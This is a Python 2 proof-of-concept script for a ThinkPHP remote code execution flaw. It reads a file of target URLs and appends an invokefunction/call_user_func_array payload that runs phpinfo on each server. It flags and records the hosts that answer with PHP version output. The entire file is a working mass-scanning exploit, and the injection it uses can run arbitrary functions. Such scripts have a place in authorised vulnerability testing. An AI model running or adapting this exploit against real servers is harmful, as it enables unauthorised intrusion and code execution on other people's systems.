# /usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests
from bs4 import BeautifulSoup
from argparse import ArgumentParser

reload(sys)
sys.setdefaultencoding('utf-8')

payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"


def get_urls(test_file):

    '''读取文件中的url地址'''

    with open(test_file, "r") as f:
        url_list = [line.strip("\n") for line in f.readlines()]
        return url_list

def run(target_file,outfile):

    '''构造url请求发送payload'''

    url_list = get_urls(target_file)
    for curl in url_list:
        target_url = curl + payload
        try:
            response = requests.get(url=target_url)
            soup = BeautifulSoup(response.text,"lxml")
            if 'PHP Version' in str(soup.text):
                print '[+] Remote code execution vulnerability exists at the target address'
                print '[+] Vulnerability url address ' + target_url
                with open(outfile,'a') as f:
                    f.write(target_url)
            else:
                print '[-] There is no remote code execution vulnerability in the target address'
        except:
            print '[!] Destination address cannot be connected'

if __name__ == '__main__':
    parser = ArgumentParser(prog='thinkphp rce poc', usage='%(prog)s [options]',
                            description="The thinkphp rce test", epilog="answer")

    parser.add_argument("-m", "--multiple", dest="bulkfile", help="scan multiple targets given in a textual file")
    parser.add_argument("-o", "--output", dest="outfile", default="url.txt",
                        help="output file name,default is url.txt")

    args = parser.parse_args()

    bulk_file = args.bulkfile
    out_file = args.outfile
    if bulk_file == None or out_file == None:
        print parser.print_help()

    else:
        run(bulk_file,out_file)
